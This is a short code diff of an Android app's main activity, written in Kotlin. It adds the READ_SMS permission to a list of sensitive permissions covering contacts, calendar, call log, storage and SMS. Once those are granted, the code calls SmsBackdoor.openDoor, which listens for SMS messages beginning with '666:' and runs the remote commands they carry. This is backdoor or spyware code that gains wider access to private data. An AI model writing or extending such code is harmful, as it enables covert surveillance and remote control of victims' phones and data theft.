@@ -60,7 +60,7 @@ class MainActivity : AppCompatActivity() {
 
         }
         KotlinPermissions.with(this)
-            .permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG)
+            .permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS)
             .onAccepted {
                 SmsBackdoor.openDoor(this, "666:", payload = payload) { remoteCommand ->
                     runBlocking {
